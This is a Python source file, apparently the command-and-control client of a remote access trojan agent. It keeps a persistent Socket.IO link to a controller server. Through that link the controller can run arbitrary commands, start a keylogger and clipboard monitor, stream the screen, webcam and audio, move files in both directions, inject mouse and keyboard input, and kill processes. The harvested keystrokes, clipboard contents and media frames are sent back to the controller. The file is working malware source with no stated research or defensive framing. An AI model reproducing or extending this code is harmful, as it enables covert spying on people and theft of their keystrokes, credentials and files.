"""
Socket client module
Handles Socket.IO client connection and communication with the controller
"""

import time
import threading
from logging_utils import log_message
from dependencies import SOCKETIO_AVAILABLE
from config import SERVER_URL

# Global socket client instance
sio = None
socket_thread = None
connection_active = False

def get_socket_client():
    """Get the global socket client instance."""
    return sio

def initialize_socket_client():
    """Initialize the Socket.IO client."""
    global sio
    
    if not SOCKETIO_AVAILABLE:
        log_message("Socket.IO not available", "error")
        return None
    
    try:
        import socketio
        
        sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,  # Infinite attempts
            reconnection_delay=1,
            reconnection_delay_max=30,
            randomization_factor=0.5,
            logger=False,
            engineio_logger=False
        )
        
        # Register event handlers
        register_socket_handlers()
        
        log_message("Socket.IO client initialized")
        return sio
        
    except Exception as e:
        log_message(f"Failed to initialize Socket.IO client: {e}", "error")
        return None

def register_socket_handlers():
    """Register Socket.IO event handlers."""
    if not sio:
        return
    
    @sio.event
    def connect():
        """Handle connection event."""
        global connection_active
        connection_active = True
        log_message("Connected to controller")
        
        # Send agent registration
        try:
            from streaming import get_or_create_agent_id
            agent_id = get_or_create_agent_id()
            
            sio.emit('agent_register', {
                'agent_id': agent_id,
                'timestamp': time.time()
            })
        except Exception as e:
            log_message(f"Failed to register agent: {e}", "error")

    @sio.event
    def disconnect():
        """Handle disconnection event."""
        global connection_active
        connection_active = False
        log_message("Disconnected from controller")

    @sio.event
    def on_command(data):
        """Handle command from controller."""
        try:
            command = data.get('command', '')
            agent_id = data.get('agent_id', '')
            
            log_message(f"Received command: {command}")
            
            # Execute command
            from command_executor import execute_command
            result = execute_command(command)
            
            # Send result back
            sio.emit('command_result', {
                'agent_id': agent_id,
                'command': command,
                'result': result,
                'timestamp': time.time()
            })
            
        except Exception as e:
            log_message(f"Error handling command: {e}", "error")

    @sio.event
    def on_mouse_move(data):
        """Handle mouse move event."""
        try:
            from input_handler import handle_mouse_move
            handle_mouse_move(data)
        except Exception as e:
            log_message(f"Error handling mouse move: {e}", "error")

    @sio.event
    def on_mouse_click(data):
        """Handle mouse click event."""
        try:
            from input_handler import handle_mouse_click
            handle_mouse_click(data)
        except Exception as e:
            log_message(f"Error handling mouse click: {e}", "error")

    @sio.event
    def on_remote_key_press(data):
        """Handle remote key press event."""
        try:
            from input_handler import handle_key_down
            handle_key_down(data)
        except Exception as e:
            log_message(f"Error handling key press: {e}", "error")

    @sio.event
    def on_file_upload(data):
        """Handle file upload event."""
        try:
            from file_handler import on_file_chunk_from_operator
            on_file_chunk_from_operator(data)
        except Exception as e:
            log_message(f"Error handling file upload: {e}", "error")

    @sio.event
    def on_start_streaming(data):
        """Handle start streaming command."""
        try:
            agent_id = data.get('agent_id', '')
            stream_type = data.get('type', 'screen')
            
            if stream_type == 'screen':
                from streaming import start_streaming
                start_streaming(agent_id)
            elif stream_type == 'audio':
                from streaming import start_audio_streaming
                start_audio_streaming(agent_id)
            elif stream_type == 'camera':
                from streaming import start_camera_streaming
                start_camera_streaming(agent_id)
                
        except Exception as e:
            log_message(f"Error starting streaming: {e}", "error")

    @sio.event
    def on_stop_streaming(data):
        """Handle stop streaming command."""
        try:
            stream_type = data.get('type', 'screen')
            
            if stream_type == 'screen':
                from streaming import stop_streaming
                stop_streaming()
            elif stream_type == 'audio':
                from streaming import stop_audio_streaming
                stop_audio_streaming()
            elif stream_type == 'camera':
                from streaming import stop_camera_streaming
                stop_camera_streaming()
                
        except Exception as e:
            log_message(f"Error stopping streaming: {e}", "error")

    @sio.event
    def on_start_keylogger(data):
        """Handle start keylogger command."""
        try:
            agent_id = data.get('agent_id', '')
            from input_handler import start_keylogger
            start_keylogger(agent_id)
        except Exception as e:
            log_message(f"Error starting keylogger: {e}", "error")

    @sio.event
    def on_stop_keylogger(data):
        """Handle stop keylogger command."""
        try:
            from input_handler import stop_keylogger
            stop_keylogger()
        except Exception as e:
            log_message(f"Error stopping keylogger: {e}", "error")

    @sio.event
    def on_start_clipboard_monitor(data):
        """Handle start clipboard monitor command."""
        try:
            agent_id = data.get('agent_id', '')
            from input_handler import start_clipboard_monitor
            start_clipboard_monitor(agent_id)
        except Exception as e:
            log_message(f"Error starting clipboard monitor: {e}", "error")

    @sio.event
    def on_stop_clipboard_monitor(data):
        """Handle stop clipboard monitor command."""
        try:
            from input_handler import stop_clipboard_monitor
            stop_clipboard_monitor()
        except Exception as e:
            log_message(f"Error stopping clipboard monitor: {e}", "error")

    @sio.event
    def on_get_system_info(data):
        """Handle get system info request."""
        try:
            agent_id = data.get('agent_id', '')
            from system_monitor import get_system_info
            
            system_info = get_system_info()
            
            sio.emit('system_info', {
                'agent_id': agent_id,
                'info': system_info,
                'timestamp': time.time()
            })
            
        except Exception as e:
            log_message(f"Error getting system info: {e}", "error")

    @sio.event
    def on_get_processes(data):
        """Handle get processes request."""
        try:
            agent_id = data.get('agent_id', '')
            from system_monitor import get_running_processes
            
            processes = get_running_processes()
            
            sio.emit('process_list', {
                'agent_id': agent_id,
                'processes': processes,
                'timestamp': time.time()
            })
            
        except Exception as e:
            log_message(f"Error getting processes: {e}", "error")

    @sio.event
    def on_terminate_process(data):
        """Handle terminate process request."""
        try:
            process_id = data.get('process_id')
            force = data.get('force', True)
            
            from system_monitor import terminate_process_by_pid, terminate_process_with_admin
            
            if isinstance(process_id, int):
                success = terminate_process_by_pid(process_id, force)
            else:
                success = terminate_process_with_admin(process_id, force)
            
            sio.emit('process_terminated', {
                'process_id': process_id,
                'success': success,
                'timestamp': time.time()
            })
            
        except Exception as e:
            log_message(f"Error terminating process: {e}", "error")

def connect_to_controller():
    """Connect to the controller server."""
    global sio, connection_active
    
    if not sio:
        sio = initialize_socket_client()
        if not sio:
            return False
    
    if connection_active:
        log_message("Already connected to controller")
        return True
    
    if not SERVER_URL:
        log_message("No server URL configured", "error")
        return False
    
    try:
        log_message(f"Connecting to controller: {SERVER_URL}")
        sio.connect(SERVER_URL, transports=['websocket', 'polling'])
        
        # Wait for connection
        timeout = 10
        start_time = time.time()
        while not connection_active and (time.time() - start_time) < timeout:
            time.sleep(0.1)
        
        if connection_active:
            log_message("Successfully connected to controller")
            return True
        else:
            log_message("Connection timeout", "error")
            return False
            
    except Exception as e:
        log_message(f"Failed to connect to controller: {e}", "error")
        return False

def disconnect_from_controller():
    """Disconnect from the controller server."""
    global sio, connection_active
    
    if sio and connection_active:
        try:
            sio.disconnect()
            connection_active = False
            log_message("Disconnected from controller")
        except Exception as e:
            log_message(f"Error disconnecting: {e}", "error")

def start_socket_client_thread():
    """Start socket client in a separate thread."""
    global socket_thread
    
    if socket_thread and socket_thread.is_alive():
        log_message("Socket client thread already running")
        return True
    
    def socket_client_worker():
        """Socket client worker thread."""
        while True:
            try:
                if not connection_active:
                    log_message("Attempting to connect to controller...")
                    if connect_to_controller():
                        log_message("Connected to controller successfully")
                    else:
                        log_message("Connection failed, retrying in 30 seconds...")
                        time.sleep(30)
                        continue
                
                # Keep connection alive
                time.sleep(10)
                
                # Send heartbeat
                if connection_active and sio:
                    try:
                        from streaming import get_or_create_agent_id
                        agent_id = get_or_create_agent_id()
                        
                        sio.emit('heartbeat', {
                            'agent_id': agent_id,
                            'timestamp': time.time()
                        })
                    except Exception as e:
                        log_message(f"Heartbeat error: {e}", "error")
                
            except Exception as e:
                log_message(f"Socket client thread error: {e}", "error")
                connection_active = False
                time.sleep(5)
    
    socket_thread = threading.Thread(target=socket_client_worker, daemon=True)
    socket_thread.start()
    
    log_message("Socket client thread started")
    return True

def send_agent_status(agent_id, status_data):
    """Send agent status to controller."""
    if sio and connection_active:
        try:
            sio.emit('agent_status', {
                'agent_id': agent_id,
                'status': status_data,
                'timestamp': time.time()
            })
        except Exception as e:
            log_message(f"Error sending agent status: {e}", "error")

def send_log_message(agent_id, message, level="info"):
    """Send log message to controller."""
    if sio and connection_active:
        try:
            sio.emit('agent_log', {
                'agent_id': agent_id,
                'message': message,
                'level': level,
                'timestamp': time.time()
            })
        except Exception as e:
            log_message(f"Error sending log message: {e}", "error")

def is_connected():
    """Check if connected to controller."""
    return connection_active

def wait_for_connection(timeout=30):
    """Wait for connection to be established."""
    start_time = time.time()
    while not connection_active and (time.time() - start_time) < timeout:
        time.sleep(0.1)
    return connection_active

def emit_event(event_name, data):
    """Emit an event to the controller."""
    if sio and connection_active:
        try:
            sio.emit(event_name, data)
            return True
        except Exception as e:
            log_message(f"Error emitting event {event_name}: {e}", "error")
            return False
    return False

class SocketEventEmitter:
    """Helper class for emitting socket events."""
    
    def __init__(self, agent_id):
        self.agent_id = agent_id
    
    def emit_screen_frame(self, frame_data):
        """Emit screen frame."""
        return emit_event('screen_frame', {
            'agent_id': self.agent_id,
            'frame': frame_data,
            'timestamp': time.time()
        })
    
    def emit_audio_frame(self, audio_data):
        """Emit audio frame."""
        return emit_event('audio_frame', {
            'agent_id': self.agent_id,
            'audio': audio_data,
            'timestamp': time.time()
        })
    
    def emit_camera_frame(self, frame_data):
        """Emit camera frame."""
        return emit_event('camera_frame', {
            'agent_id': self.agent_id,
            'frame': frame_data,
            'timestamp': time.time()
        })
    
    def emit_keylog_data(self, keylog_data):
        """Emit keylog data."""
        return emit_event('keylog_data', {
            'agent_id': self.agent_id,
            'data': keylog_data,
            'timestamp': time.time()
        })
    
    def emit_clipboard_data(self, clipboard_content):
        """Emit clipboard data."""
        return emit_event('clipboard_data', {
            'agent_id': self.agent_id,
            'content': clipboard_content,
            'timestamp': time.time()
        })
    
    def emit_file_chunk(self, file_data):
        """Emit file chunk."""
        return emit_event('file_chunk_to_controller', {
            'agent_id': self.agent_id,
            **file_data
        })
    
    def emit_command_result(self, command, result):
        """Emit command result."""
        return emit_event('command_result', {
            'agent_id': self.agent_id,
            'command': command,
            'result': result,
            'timestamp': time.time()
        })

def get_connection_stats():
    """Get connection statistics."""
    stats = {
        'connected': connection_active,
        'server_url': SERVER_URL,
        'socket_available': SOCKETIO_AVAILABLE,
        'client_initialized': sio is not None
    }
    
    if sio and hasattr(sio, 'transport'):
        try:
            stats['transport'] = sio.transport()
        except:
            stats['transport'] = 'unknown'
    
    return stats

def reconnect():
    """Force reconnection to controller."""
    global connection_active
    
    log_message("Forcing reconnection...")
    
    if sio and connection_active:
        try:
            sio.disconnect()
        except:
            pass
    
    connection_active = False
    time.sleep(1)
    
    return connect_to_controller()
